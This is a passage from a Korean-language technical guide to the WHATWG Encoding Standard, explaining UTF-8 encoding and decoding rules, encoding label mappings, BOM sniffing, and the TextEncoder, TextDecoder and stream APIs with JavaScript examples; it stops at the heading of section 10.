# WHATWG Encoding과 MIME Sniffing

## WHATWG Encoding Standard 완벽 가이드

### 목차

1. [개요](#1-개요)
2. [용어 정의](#2-용어-정의)
3. [인코딩 목록](#3-인코딩-목록)
4. [UTF-8 상세](#4-utf-8-상세)
5. [인코딩 레이블 매핑](#5-인코딩-레이블-매핑)
6. [BOM 스니핑](#6-bom-스니핑)
7. [TextEncoder API](#7-textencoder-api)
8. [TextDecoder API](#8-textdecoder-api)
9. [TextEncoderStream / TextDecoderStream](#9-textencoderstream--textdecoderstream)
10. [웹에서의 인코딩 감지](#10-웹에서의-인코딩-감지)
11. [한국어 인코딩](#11-한국어-인코딩)
12. [실용 예제](#12-실용-예제)

---

### 1. 개요

#### 1.1 Encoding Standard란

WHATWG Encoding Standard는 웹 플랫폼에서 문자 인코딩을 처리하는 방식을 정의하는 살아있는 표준(Living Standard)이다. 이 표준은 텍스트를 바이트 시퀀스로 변환(인코딩)하고, 바이트 시퀀스를 텍스트로 복원(디코딩)하는 알고리즘을 규정한다.

- 공식 문서: https://encoding.spec.whatwg.org/
- 유지보수 주체: WHATWG (Web Hypertext Application Technology Working Group)
- 문서 유형: Living Standard
- 핵심 메시지: UTF-8을 사용하라. 새로운 콘텐츠는 반드시 UTF-8로 인코딩되어야 한다.

#### 1.2 문자 인코딩의 역사

컴퓨터가 텍스트를 처리하려면 문자를 숫자(바이트)로 변환하는 규칙이 필요하다. 이 규칙이 바로 문자 인코딩이다.

| 시기 | 인코딩 | 설명 |
|------|--------|------|
| 1963 | ASCII | 7비트, 128개 문자 (영문, 숫자, 기호) |
| 1987 | ISO 8859-1 | 8비트, 서유럽 문자 256개 |
| 1990s | EUC-KR | 한국어 완성형 인코딩 (KS X 1001 기반) |
| 1990s | Shift_JIS | 일본어 인코딩 |
| 1993 | Unicode 1.1 | 전 세계 문자를 하나의 체계로 통합 시도 |
| 1993 | UTF-8 | 가변 길이 유니코드 인코딩 (1~4바이트) |
| 2003 | UTF-8 보편화 | 웹에서 UTF-8 사용 비율이 급격히 증가 |
| 2008~ | UTF-8 표준화 | W3C/WHATWG에서 UTF-8을 기본 인코딩으로 권장 |

```
ASCII (1963)
  A = 0x41, B = 0x42, ... Z = 0x5A
  0~127 범위의 7비트 인코딩

ISO-8859-1 (1987)
  ASCII 확장, 128~255에 서유럽 문자 배치
  ä = 0xE4, ö = 0xF6, ü = 0xFC

EUC-KR (1990s)
  한글 2바이트, ASCII 1바이트
  "가" = 0xB0 0xA1, "나" = 0xB3 0xAA

UTF-8 (1993~)
  가변 길이 유니코드 인코딩
  "A" = 0x41 (1바이트)
  "가" = 0xEA 0xB0 0x80 (3바이트)
  "😀" = 0xF0 0x9F 0x98 0x80 (4바이트)
```

#### 1.3 왜 표준이 필요한가

인코딩 표준이 필요한 핵심 이유는 다음과 같다.

1) 레거시 인코딩의 상호운용성

웹에는 다양한 레거시 인코딩으로 작성된 문서가 존재한다. 브라우저마다 동일한 바이트 시퀀스를 다른 문자로 해석하면 글자가 깨지는 "mojibake" 현상이 발생한다. 표준은 모든 브라우저가 동일한 방식으로 레거시 인코딩을 처리하도록 보장한다.

2) 보안 취약점 방지

인코딩 처리의 불일치는 XSS(Cross-Site Scripting) 등 보안 취약점으로 이어질 수 있다. 예를 들어 특정 레거시 인코딩에서 멀티바이트 문자의 첫 번째 바이트가 이스케이프 문자를 "삼켜버리는" 공격이 존재한다.

3) JavaScript API의 통일

`TextEncoder`, `TextDecoder` 등 웹 API를 명확하게 정의하여 모든 플랫폼에서 동일한 인코딩/디코딩 동작을 보장한다.

4) UTF-8로의 수렴 촉진

표준은 새 콘텐츠에 대해 UTF-8만 인코딩하도록 제한하고(`TextEncoder`는 UTF-8만 지원), 레거시 인코딩은 디코딩만 허용함으로써 웹 전체가 UTF-8로 수렴하도록 유도한다.

```javascript
// TextEncoder는 항상 UTF-8만 사용한다
const encoder = new TextEncoder();
console.log(encoder.encoding); // "utf-8"

// TextDecoder는 레거시 인코딩도 디코딩할 수 있다
const decoder = new TextDecoder('euc-kr');
console.log(decoder.encoding); // "euc-kr"
```

---

### 2. 용어 정의

#### 2.1 코드 포인트 (Code Point)

유니코드에서 각 문자에 부여된 고유한 숫자 값이다. U+0000부터 U+10FFFF까지의 범위를 가진다. 총 1,114,112개의 코드 포인트가 존재한다.

```javascript
// 코드 포인트 확인
'A'.codePointAt(0);    // 65 (U+0041)
'가'.codePointAt(0);   // 44032 (U+AC00)
'😀'.codePointAt(0);   // 128512 (U+1F600)

// 코드 포인트에서 문자로
String.fromCodePoint(0xAC00);  // "가"
String.fromCodePoint(0x1F600); // "😀"
```

코드 포인트의 분류:

| 범위 | 이름 | 설명 |
|------|------|------|
| U+0000~U+007F | ASCII | 기본 라틴 문자 |
| U+0080~U+07FF | BMP 앞부분 | 대부분의 라틴 확장, 그리스, 키릴 등 |
| U+0800~U+FFFF | BMP 나머지 | 한중일 문자, 한글 등 |
| U+10000~U+10FFFF | 보충 평면 | 이모지, 고대 문자, 수학 기호 등 |
| U+D800~U+DFFF | 서로게이트 | UTF-16 전용, 단독 사용 불가 (스칼라 값이 아님) |

#### 2.2 스칼라 값 (Scalar Value)

서로게이트(U+D800~U+DFFF)를 제외한 코드 포인트를 스칼라 값이라 한다. 실제 문자를 나타낼 수 있는 유효한 코드 포인트만을 의미한다.

#### 2.3 바이트 (Byte)

0x00부터 0xFF까지의 8비트 정수 값이다. 인코딩된 데이터의 기본 단위이다.

#### 2.4 바이트 시퀀스 (Byte Sequence)

0개 이상의 바이트가 순서대로 나열된 것이다. 인코딩의 출력과 디코딩의 입력은 바이트 시퀀스이다.

#### 2.5 인코딩 (Encoding)

코드 포인트 시퀀스와 바이트 시퀀스 사이의 매핑 규칙이다. 각 인코딩은 이름(name), 디코더(decoder), 인코더(encoder, 선택적)를 가진다.

#### 2.6 디코더 (Decoder)

바이트 스트림을 입력으로 받아 코드 포인트 스트림을 출력하는 알고리즘이다. 유효하지 않은 바이트를 만나면 오류를 발생시키거나 대체 문자(U+FFFD)를 출력한다.

#### 2.7 인코더 (Encoder)

코드 포인트 스트림을 입력으로 받아 바이트 스트림을 출력하는 알고리즘이다. 표준에서는 UTF-8 인코더만 웹 API로 노출된다.

#### 2.8 BOM (Byte Order Mark)

U+FEFF 코드 포인트로, 문서의 시작 부분에 위치하여 인코딩의 종류와 바이트 순서를 나타내는 표시이다.

```javascript
// BOM의 바이트 표현
// UTF-8 BOM:    0xEF 0xBB 0xBF
// UTF-16 BE BOM: 0xFE 0xFF
// UTF-16 LE BOM: 0xFF 0xFE

const utf8Bom = new Uint8Array([0xEF, 0xBB, 0xBF]);
const decoder = new TextDecoder('utf-8');
decoder.decode(utf8Bom); // "" (BOM은 기본적으로 제거됨)
```

#### 2.9 U+FFFD REPLACEMENT CHARACTER

디코딩 중 유효하지 않은 바이트 시퀀스를 만났을 때 사용되는 대체 문자이다. "�"로 표시된다.

```javascript
// 유효하지 않은 UTF-8 바이트 → U+FFFD로 대체
const invalid = new Uint8Array([0xFF, 0xFE, 0x41]);
const decoder = new TextDecoder('utf-8');
console.log(decoder.decode(invalid)); // "��A"
```

---

### 3. 인코딩 목록

Encoding Standard는 웹 호환성을 위해 다양한 레거시 인코딩을 지원한다. 그러나 새 콘텐츠에는 반드시 UTF-8을 사용해야 한다.

#### 3.1 UTF-8 (유일한 필수 인코딩)

| 속성 | 값 |
|------|------|
| 이름 | UTF-8 |
| 유형 | 가변 길이 (1~4바이트) |
| 범위 | U+0000~U+10FFFF (전체 유니코드) |
| 웹 사용률 | 98% 이상 (2024년 기준) |
| TextEncoder 지원 | 인코딩 + 디코딩 |

#### 3.2 Legacy single-byte 인코딩

1바이트로 1문자를 표현하는 인코딩이다. 0x00~0x7F는 ASCII와 동일하고, 0x80~0xFF 범위에 각 인코딩 고유의 문자가 배치된다.

| 인코딩 이름 | 주요 사용 지역 | 설명 |
|-------------|---------------|------|
| windows-1252 | 서유럽 | ISO-8859-1의 상위 집합, 웹에서 가장 흔한 single-byte 레거시 |
| ISO-8859-2 | 중앙유럽 | 폴란드어, 체코어, 헝가리어 등 |
| ISO-8859-3 | 남유럽 | 터키어, 몰타어, 에스페란토 |
| ISO-8859-4 | 북유럽 | 에스토니아어, 라트비아어, 리투아니아어 |
| ISO-8859-5 | 키릴 | 러시아어, 불가리아어 등 (사용 빈도 낮음) |
| ISO-8859-6 | 아랍어 | 아랍 문자 |
| ISO-8859-7 | 그리스어 | 현대 그리스 문자 |
| ISO-8859-8 | 히브리어 | 히브리 문자 (시각적 순서) |
| ISO-8859-8-I | 히브리어 | 히브리 문자 (논리적 순서) |
| ISO-8859-10 | 북유럽 | 사미어, 아이슬란드어 등 |
| ISO-8859-13 | 발트해 | 라트비아어, 리투아니아어 |
| ISO-8859-14 | 켈트 | 아일랜드어, 웨일스어 |
| ISO-8859-15 | 서유럽 | ISO-8859-1 + 유로 기호(€) |
| ISO-8859-16 | 남동유럽 | 루마니아어 등 |
| IBM866 | 러시아 | DOS 코드페이지 866, 러시아어. 레이블: `866`, `cp866`, `csibm866`, `ibm866` |
| KOI8-R | 러시아 | 러시아어 키릴 문자 |
| KOI8-U | 우크라이나 | 우크라이나어 키릴 문자 |
| macintosh | - | Mac OS Roman 인코딩 |
| windows-874 | 태국 | 태국어 |
| windows-1250 | 중앙유럽 | 폴란드어, 체코어 등 |
| windows-1251 | 키릴 | 러시아어, 우크라이나어 등 |
| windows-1253 | 그리스어 | 현대 그리스어 |
| windows-1254 | 터키어 | 터키어 |
| windows-1255 | 히브리어 | 히브리어 |
| windows-1256 | 아랍어 | 아랍어 |
| windows-1257 | 발트해 | 발트 3국 언어 |
| windows-1258 | 베트남어 | 베트남어 |
| x-mac-cyrillic | 키릴 | Mac OS 키릴 문자 |

#### 3.3 Legacy multi-byte CJK 인코딩

한중일(CJK) 문자를 표현하기 위한 멀티바이트 인코딩이다.

| 인코딩 이름 | 주요 사용 | 바이트 수 | 설명 |
|-------------|----------|----------|------|
| EUC-KR | 한국어 | 1~2 | KS X 1001 기반, 실제로는 cp949(UHC) |
| EUC-JP | 일본어 | 1~3 | JIS X 0208/0212 기반 |
| Shift_JIS | 일본어 | 1~2 | Windows에서 널리 사용 |
| ISO-2022-JP | 일본어 | 가변 | 이스케이프 시퀀스 기반 상태 전환 인코딩 |
| Big5 | 중국어(번체) | 1~2 | 대만/홍콩에서 사용 |
| GBK | 중국어(간체) | 1~2 | GB2312의 상위 집합 |
| gb18030 | 중국어(간체) | 1~4 | GBK의 상위 집합, 전체 유니코드 포함 |
| GB2312 | 중국어(간체) | 1~2 | 실제로는 GBK로 처리됨 |

> 참고: 표준에서 `GB2312` 레이블은 `GBK` 인코딩으로 매핑된다. `gb18030`은 유니코드의 모든 코드 포인트를 표현할 수 있는 유일한 레거시 인코딩이다.

#### 3.4 Legacy 기타 인코딩

| 인코딩 이름 | 설명 |
|-------------|------|
| UTF-16BE | UTF-16 빅 엔디안. 디코딩만 지원 |
| UTF-16LE | UTF-16 리틀 엔디안. 디코딩만 지원 |
| x-user-defined | 0x80~0xFF를 U+F780~U+F7FF에 매핑하는 특수 인코딩 |
| replacement | 항상 디코딩 실패(U+FFFD)를 반환하는 특수 인코딩. 보안상 위험한 인코딩에 대한 안전장치 |

> replacement 인코딩이 필요한 이유: ISO-2022-KR, ISO-2022-CN 등 일부 레거시 인코딩은 보안 취약점(상태 전환을 악용한 XSS)이 있어, 표준에서는 이들을 `replacement`로 매핑하여 항상 오류를 반환하도록 한다.

```javascript
// replacement 인코딩의 동작
const decoder = new TextDecoder('iso-2022-kr');
// 실제로는 replacement 디코더가 사용됨
// 어떤 입력이든 U+FFFD 하나만 출력하고 끝남
```

---

### 4. UTF-8 상세

#### 4.1 인코딩 규칙

UTF-8은 코드 포인트 값에 따라 1~4바이트의 가변 길이로 인코딩한다.

| 코드 포인트 범위 | 바이트 수 | 바이트 1 | 바이트 2 | 바이트 3 | 바이트 4 |
|-----------------|----------|---------|---------|---------|---------|
| U+0000~U+007F | 1 | 0xxxxxxx | - | - | - |
| U+0080~U+07FF | 2 | 110xxxxx | 10xxxxxx | - | - |
| U+0800~U+FFFF | 3 | 1110xxxx | 10xxxxxx | 10xxxxxx | - |
| U+10000~U+10FFFF | 4 | 11110xxx | 10xxxxxx | 10xxxxxx | 10xxxxxx |

인코딩 과정 예시:

```javascript
// "가" = U+AC00 → 3바이트 인코딩
// U+AC00 = 1010_1100_0000_0000 (2진수)
// 3바이트 패턴: 1110xxxx 10xxxxxx 10xxxxxx
// x 채우기:     1110_1010 10_1100_00 10_000000
//             = 0xEA     0xB0       0x80

const encoder = new TextEncoder();
const bytes = encoder.encode('가');
console.log([...bytes].map(b => '0x' + b.toString(16).toUpperCase()));
// ["0xEA", "0xB0", "0x80"]

// "A" = U+0041 → 1바이트
console.log([...encoder.encode('A')].map(b => '0x' + b.toString(16)));
// ["0x41"]

// "€" = U+20AC → 3바이트
console.log([...encoder.encode('€')].map(b => '0x' + b.toString(16)));
// ["0xe2", "0x82", "0xac"]

// "😀" = U+1F600 → 4바이트
console.log([...encoder.encode('😀')].map(b => '0x' + b.toString(16)));
// ["0xf0", "0x9f", "0x98", "0x80"]
```

#### 4.2 UTF-8 디코딩 알고리즘

표준은 상태 머신 기반의 디코더를 정의한다. 핵심 로직은 다음과 같다.

```
UTF-8 디코더 상태:
- utf-8 code point: 초기값 0
- utf-8 bytes seen: 초기값 0
- utf-8 bytes needed: 초기값 0
- utf-8 lower boundary: 초기값 0x80
- utf-8 upper boundary: 초기값 0xBF

바이트 처리:
1. bytes_needed가 0이면:
   - 0x00~0x7F → 해당 코드 포인트 반환
   - 0xC2~0xDF → bytes_needed=1, code_point = byte & 0x1F
   - 0xE0~0xEF → bytes_needed=2, code_point = byte & 0x0F
     - 0xE0이면 lower=0xA0 (overlong 방지)
     - 0xED이면 upper=0x9F (서로게이트 방지)
   - 0xF0~0xF4 → bytes_needed=3, code_point = byte & 0x07
     - 0xF0이면 lower=0x90 (overlong 방지)
     - 0xF4이면 upper=0x8F (U+10FFFF 초과 방지)
   - 그 외 → 오류(U+FFFD)

2. bytes_needed > 0이면:
   - 바이트가 lower~upper 범위가 아니면 → 오류, 상태 리셋, 바이트 다시 처리
   - 범위 안이면 → code_point를 갱신, bytes_seen 증가
   - bytes_seen == bytes_needed이면 → code_point 반환, 상태 리셋
```

#### 4.3 오류 처리 (U+FFFD)

UTF-8 디코더가 유효하지 않은 바이트를 만났을 때의 동작을 정의한다.

```javascript
// 기본 동작: 잘못된 바이트를 U+FFFD로 대체
const decoder = new TextDecoder('utf-8');
const invalid = new Uint8Array([0x48, 0x80, 0x65, 0x6C, 0x6C, 0x6F]);
//                                H    ^^err   e     l     l     o
console.log(decoder.decode(invalid)); // "H�ello"

// fatal 모드: 잘못된 바이트가 있으면 예외 발생
const strictDecoder = new TextDecoder('utf-8', { fatal: true });
try {
  strictDecoder.decode(invalid);
} catch (e) {
  console.log(e.message); // "The encoded data was not valid."
  console.log(e instanceof TypeError); // true
}
```

오류 대체의 세부 규칙 (최대 오류 원칙):

```javascript
// 각 유효하지 않은 바이트 시퀀스 단위마다 U+FFFD 하나를 생성한다
// 연속된 유효하지 않은 바이트도 개별적으로 U+FFFD가 된다

// 예: 불완전한 멀티바이트 시퀀스
const bytes1 = new Uint8Array([0xC2]); // 2바이트 시퀀스의 시작이지만 후속 바이트 없음
console.log(new TextDecoder().decode(bytes1)); // "�"

// 예: overlong 인코딩 (보안상 거부됨)
// U+002F "/"를 2바이트로 인코딩하면 0xC0 0xAF → 거부
const overlong = new Uint8Array([0xC0, 0xAF]);
console.log(new TextDecoder().decode(overlong)); // "��"
```

#### 4.4 유효성 검사

UTF-8 바이트 시퀀스가 유효하려면 다음 조건을 모두 만족해야 한다.

```
유효한 UTF-8 바이트 시퀀스 규칙:
1. 첫 바이트 0x00~0x7F → 1바이트 (단독)
2. 첫 바이트 0xC2~0xDF → 2바이트 (두 번째: 0x80~0xBF)
3. 첫 바이트 0xE0 → 3바이트 (두 번째: 0xA0~0xBF, 세 번째: 0x80~0xBF)
4. 첫 바이트 0xE1~0xEC → 3바이트 (두 번째: 0x80~0xBF, 세 번째: 0x80~0xBF)
5. 첫 바이트 0xED → 3바이트 (두 번째: 0x80~0x9F, 세 번째: 0x80~0xBF)
6. 첫 바이트 0xEE~0xEF → 3바이트 (두 번째: 0x80~0xBF, 세 번째: 0x80~0xBF)
7. 첫 바이트 0xF0 → 4바이트 (두 번째: 0x90~0xBF, 세 번째~네 번째: 0x80~0xBF)
8. 첫 바이트 0xF1~0xF3 → 4바이트 (두 번째~네 번째: 0x80~0xBF)
9. 첫 바이트 0xF4 → 4바이트 (두 번째: 0x80~0x8F, 세 번째~네 번째: 0x80~0xBF)

거부되는 것:
- 0xC0~0xC1 (overlong 2바이트)
- 0xF5~0xFF (범위 초과)
- 서로게이트 코드 포인트 (U+D800~U+DFFF → 0xED 0xA0 0x80 ~ 0xED 0xBF 0xBF)
```

```javascript
// UTF-8 유효성 검사 함수
function isValidUTF8(bytes) {
  try {
    const decoder = new TextDecoder('utf-8', { fatal: true });
    decoder.decode(bytes);
    return true;
  } catch {
    return false;
  }
}

console.log(isValidUTF8(new Uint8Array([0x48, 0x65, 0x6C, 0x6C, 0x6F]))); // true "Hello"
console.log(isValidUTF8(new Uint8Array([0xEA, 0xB0, 0x80])));             // true "가"
console.log(isValidUTF8(new Uint8Array([0xC0, 0xAF])));                    // false (overlong)
console.log(isValidUTF8(new Uint8Array([0xED, 0xA0, 0x80])));             // false (서로게이트)
```

---

### 5. 인코딩 레이블 매핑

#### 5.1 이름과 별칭

각 인코딩에는 하나의 정규 이름(name)과 여러 개의 레이블(별칭)이 있다. 웹에서는 다양한 이름으로 같은 인코딩을 지칭하므로, 표준은 이들을 모두 하나의 인코딩으로 매핑한다.

| 정규 이름 | 레이블 (별칭) |
|-----------|-------------|
| UTF-8 | `utf-8`, `utf8`, `unicode-1-1-utf-8`, `unicode11utf8`, `unicode20utf8`, `x-unicode20utf8` |
| windows-1252 | `ascii`, `ansi_x3.4-1968`, `cp1252`, `cp819`, `csisolatin1`, `ibm819`, `iso-8859-1`, `iso-ir-100`, `iso8859-1`, `iso88591`, `iso_8859-1`, `l1`, `latin1`, `us-ascii`, `x-cp1252` |
| EUC-KR | `euc-kr`, `cseuckr`, `csksc56011987`, `iso-ir-149`, `korean`, `ks_c_5601-1987`, `ks_c_5601-1989`, `ksc5601`, `ksc_5601`, `windows-949` |
| Shift_JIS | `shift_jis`, `csshiftjis`, `ms932`, `ms_kanji`, `shift-jis`, `sjis`, `windows-31j`, `x-sjis` |
| EUC-JP | `euc-jp`, `cseucpkdfmtjapanese`, `x-euc-jp` |
| ISO-2022-JP | `iso-2022-jp`, `csiso2022jp` |
| Big5 | `big5`, `big5-hkscs`, `cn-big5`, `csbig5`, `x-x-big5` |
| GBK | `gbk`, `chinese`, `csgb2312`, `csiso58gb231280`, `gb2312`, `gb_2312`, `gb_2312-80`, `iso-ir-58`, `x-gbk` |
| gb18030 | `gb18030` |
| UTF-16BE | `utf-16be`, `unicodefffe` |
| UTF-16LE | `utf-16le`, `utf-16`, `unicodefeff` |

> 중요: `ascii`, `iso-8859-1`, `latin1`, `us-ascii`는 모두 `windows-1252`로 매핑된다. 이는 웹 호환성을 위한 의도적인 결정이다. 실제 웹에서 이 레이블들로 선언된 문서 대부분이 0x80~0x9F 범위의 windows-1252 전용 문자를 사용하기 때문이다.

#### 5.2 get an encoding 알고리즘

레이블 문자열을 받아 대응하는 인코딩 객체를 반환하는 알고리즘이다.

```
get an encoding(label):
1. label의 앞뒤 ASCII 공백을 제거한다
2. label을 ASCII 소문자로 변환한다
3. 변환된 label이 인코딩 레이블 테이블에 있으면 해당 인코딩을 반환한다
4. 없으면 null을 반환한다 (실패)
```

```javascript
// JavaScript에서의 동작 예시
new TextDecoder('UTF-8');          // 유효: utf-8로 정규화
new TextDecoder('  utf-8  ');      // 유효: 공백 제거 후 utf-8
new TextDecoder('latin1');         // 유효: windows-1252로 매핑
new TextDecoder('ascii');          // 유효: windows-1252로 매핑
new TextDecoder('euc-kr');         // 유효
new TextDecoder('windows-949');    // 유효: EUC-KR로 매핑
new TextDecoder('ks_c_5601-1987'); // 유효: EUC-KR로 매핑

try {
  new TextDecoder('invalid-encoding'); // RangeError: 알 수 없는 레이블
} catch (e) {
  console.log(e instanceof RangeError); // true
}
```

---

### 6. BOM 스니핑

#### 6.1 BOM을 통한 인코딩 감지

BOM(Byte Order Mark)은 바이트 시퀀스의 시작 부분에 위치하여 인코딩을 식별하는 데 사용될 수 있다.

| BOM 바이트 시퀀스 | 감지되는 인코딩 |
|------------------|---------------|
| 0xEF 0xBB 0xBF | UTF-8 |
| 0xFE 0xFF | UTF-16BE |
| 0xFF 0xFE | UTF-16LE |

#### 6.2 BOM 스니핑 알고리즘

```
BOM sniff(ioQueue):
1. ioQueue의 처음 3바이트를 확인한다
2. 0xEF 0xBB 0xBF이면 → UTF-8 반환
3. 0xFE 0xFF이면 → UTF-16BE 반환
4. 0xFF 0xFE이면 → UTF-16LE 반환
5. 해당 없으면 → null 반환 (BOM 없음)
```

BOM 스니핑은 다른 인코딩 감지 메커니즘(Content-Type, meta charset 등)보다 우선순위가 높다.

```javascript
// BOM이 있는 UTF-8 데이터
const withBom = new Uint8Array([
  0xEF, 0xBB, 0xBF,               // UTF-8 BOM
  0xED, 0x95, 0x9C, 0xEA, 0xB8, 0x80  // "한글"
]);

// ignoreBOM: false (기본값) → BOM을 무시하고 제거
const decoder1 = new TextDecoder('utf-8');
console.log(decoder1.decode(withBom)); // "한글" (BOM 제거됨)

// ignoreBOM: true → BOM을 일반 문자로 취급하여 유지
const decoder2 = new TextDecoder('utf-8', { ignoreBOM: true });
console.log(decoder2.decode(withBom)); // "\uFEFF한글" (BOM 포함)
console.log(decoder2.decode(withBom).length); // 3
```

#### 6.3 BOM과 인코딩 우선순위

실제 브라우저에서 BOM은 선언된 인코딩보다 우선한다.

```html
<!-- meta charset이 euc-kr이어도 BOM이 UTF-8이면 UTF-8로 디코딩 -->
<!-- 파일 시작에 0xEF 0xBB 0xBF가 있으면 UTF-8 -->
<meta charset="euc-kr">
<!-- ↑ BOM이 UTF-8이면 이 선언은 무시됨 -->
```

---

### 7. TextEncoder API

#### 7.1 생성자

`TextEncoder`는 문자열을 UTF-8 바이트 시퀀스로 인코딩하는 API이다. 항상 UTF-8만 사용한다.

```javascript
const encoder = new TextEncoder();
// 매개변수 없음. 항상 UTF-8.
console.log(encoder.encoding); // "utf-8"
```

#### 7.2 encode(input)

문자열을 받아 `Uint8Array`를 반환한다.

```javascript
const encoder = new TextEncoder();

// 기본 사용
const bytes = encoder.encode('Hello, 세계!');
console.log(bytes);
// Uint8Array [72, 101, 108, 108, 111, 44, 32, 236, 132, 184, 234, 179, 132, 33]

// 빈 문자열
console.log(encoder.encode('')); // Uint8Array []

// 이모지 (4바이트 UTF-8)
const emojiBytes = encoder.encode('🎉');
console.log([...emojiBytes]); // [240, 159, 142, 137]
console.log(emojiBytes.length); // 4

// 서로게이트 쌍이 아닌 lone surrogate는 U+FFFD로 대체됨
const withSurrogate = 'A\uD800B'; // lone surrogate 포함
const result = encoder.encode(withSurrogate);
console.log(new TextDecoder().decode(result)); // "A�B"
```

#### 7.3 encodeInto(input, destination)

문자열을 지정된 `Uint8Array`에 직접 인코딩한다. 새 배열을 생성하지 않으므로 성능상 유리하다.

```javascript
const encoder = new TextEncoder();

// 충분한 크기의 버퍼
const buffer = new Uint8Array(100);
const result = encoder.encodeInto('안녕하세요', buffer);
console.log(result);
// { read: 5, written: 15 }
// read: 읽은 문자열의 코드 유닛 수
// written: 버퍼에 쓴 바이트 수

// 버퍼가 부족한 경우
const smallBuffer = new Uint8Array(5);
const result2 = encoder.encodeInto('안녕하세요', smallBuffer);
console.log(result2);
// { read: 1, written: 3 }
// "안"(3바이트)만 기록되고, "녕"(3바이트)은 공간 부족으로 기록되지 않음

// 최적 버퍼 크기 계산: 문자열 길이 * 3
// (BMP 문자는 최대 3바이트, 보충 문자는 4바이트이지만 JS에서 2 코드 유닛)
const optimalSize = 'Hello'.length * 3;
const optimalBuffer = new Uint8Array(optimalSize);
encoder.encodeInto('Hello', optimalBuffer);
```

#### 7.4 encoding 속성

```javascript
const encoder = new TextEncoder();
console.log(encoder.encoding); // "utf-8" (읽기 전용, 항상 이 값)
```

---

### 8. TextDecoder API

#### 8.1 생성자

```javascript
// 기본: UTF-8 디코더
const decoder1 = new TextDecoder();
console.log(decoder1.encoding); // "utf-8"

// 레이블 지정
const decoder2 = new TextDecoder('euc-kr');
console.log(decoder2.encoding); // "euc-kr"

// 옵션
const decoder3 = new TextDecoder('utf-8', {
  fatal: false,    // true이면 유효하지 않은 입력에서 TypeError 발생
  ignoreBOM: false // true이면 BOM을 제거하지 않음
});
```

#### 8.2 decode(input, options)

```javascript
const decoder = new TextDecoder('utf-8');

// Uint8Array 디코딩
const bytes = new Uint8Array([0xED, 0x95, 0x9C, 0xEA, 0xB8, 0x80]);
console.log(decoder.decode(bytes)); // "한글"

// ArrayBuffer 디코딩
const buffer = new ArrayBuffer(3);
new Uint8Array(buffer).set([0x41, 0x42, 0x43]);
console.log(decoder.decode(buffer)); // "ABC"

// DataView 디코딩
const view = new DataView(buffer);
console.log(decoder.decode(view)); // "ABC"

// stream 옵션: 청크 단위로 디코딩할 때 사용
const streamDecoder = new TextDecoder('utf-8');
// "가" = 0xEA 0xB0 0x80 → 3바이트를 두 청크로 나눔
const chunk1 = new Uint8Array([0xEA, 0xB0]);
const chunk2 = new Uint8Array([0x80]);

let result = '';
result += streamDecoder.decode(chunk1, { stream: true }); // 아직 완전한 문자 없음
result += streamDecoder.decode(chunk2, { stream: true }); // "가" 완성
result += streamDecoder.decode(); // 스트림 종료
console.log(result); // "가"
```

#### 8.3 EUC-KR 디코딩 예시

```javascript
// EUC-KR로 인코딩된 한국어 텍스트 디코딩
const eucKrDecoder = new TextDecoder('euc-kr');
const eucKrBytes = new Uint8Array([
  0xC7, 0xD1, 0xB1, 0xB9, 0xBE, 0xEE // "한국어"
]);
console.log(eucKrDecoder.decode(eucKrBytes)); // "한국어"

// 실전: fetch로 EUC-KR 페이지 읽기
async function fetchEucKr(url) {
  const response = await fetch(url);
  const buffer = await response.arrayBuffer();
  const decoder = new TextDecoder('euc-kr');
  return decoder.decode(buffer);
}
```

#### 8.4 속성

```javascript
const decoder = new TextDecoder('euc-kr', { fatal: true, ignoreBOM: true });

console.log(decoder.encoding);  // "euc-kr" (읽기 전용)
console.log(decoder.fatal);     // true (읽기 전용)
console.log(decoder.ignoreBOM); // true (읽기 전용)
```

#### 8.5 fatal 모드 상세

```javascript
// fatal: false (기본값) - 오류 시 U+FFFD 대체
const lenient = new TextDecoder('utf-8', { fatal: false });
const bad = new Uint8Array([0xFF, 0x41]);
console.log(lenient.decode(bad)); // "�A"

// fatal: true - 오류 시 TypeError 발생
const strict = new TextDecoder('utf-8', { fatal: true });
try {
  strict.decode(bad);
} catch (e) {
  console.log(e instanceof TypeError); // true
}

// 실전: 유효성 검사에 활용
function isValidEncoding(bytes, encoding) {
  try {
    new TextDecoder(encoding, { fatal: true }).decode(bytes);
    return true;
  } catch {
    return false;
  }
}
```

---

### 9. TextEncoderStream / TextDecoderStream

#### 9.1 TextEncoderStream

문자열 청크를 UTF-8 `Uint8Array` 청크로 변환하는 Transform Stream이다.

```javascript
// TextEncoderStream 기본 사용
const encoderStream = new TextEncoderStream();
console.log(encoderStream.encoding); // "utf-8"
console.log(encoderStream.readable); // ReadableStream
console.log(encoderStream.writable); // WritableStream

// 파이프라인 구성
const readable = new ReadableStream({
  start(controller) {
    controller.enqueue('안녕');
    controller.enqueue('하세요');
    controller.close();
  }
});

const encoded = readable.pipeThrough(new TextEncoderStream());
const reader = encoded.getReader();

async function readAll() {
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    console.log(value); // Uint8Array 청크들
  }
}
readAll();
```

#### 9.2 TextDecoderStream

바이트 청크를 문자열 청크로 변환하는 Transform Stream이다. 멀티바이트 문자가 청크 경계에 걸쳐도 올바르게 처리한다.

```javascript
// TextDecoderStream 기본 사용
const decoderStream = new TextDecoderStream('utf-8');
console.log(decoderStream.encoding);  // "utf-8"
console.log(decoderStream.fatal);     // false
console.log(decoderStream.ignoreBOM); // false

// 레거시 인코딩도 지원
const eucKrStream = new TextDecoderStream('euc-kr');

// fetch + stream API와 함께 사용
async function streamDecode(url) {
  const response = await fetch(url);
  const decoderStream = new TextDecoderStream('utf-8');
  const reader = response.body.pipeThrough(decoderStream).getReader();

  let text = '';
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    text += value;
  }
  return text;
}
```

#### 9.3 멀티바이트 문자의 청크 경계 처리

스트림 디코더의 핵심 장점은 멀티바이트 문자가 청크 사이에 분할되어도 올바르게 처리한다는 것이다.

```javascript
// "가" = 0xEA 0xB0 0x80 (3바이트)
// 청크 경계에 걸친 경우를 자동으로 처리

const decoderStream = new TextDecoderStream('utf-8');
const writer = decoderStream.writable.getWriter();
const reader = decoderStream.readable.getReader();

async function demo() {
  // 바이트를 두 청크로 나누어 전송
  writer.write(new Uint8Array([0xEA, 0xB0])); // "가"의 앞 2바이트
  writer.write(new Uint8Array([0x80, 0x41])); // "가"의 마지막 바이트 + "A"
  writer.close();

  let result = '';
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    result += value;
  }
  console.log(result); // "가A" (올바르게 조합됨)
}
demo();
```

---

### 10. 웹에서의 인코딩 감지

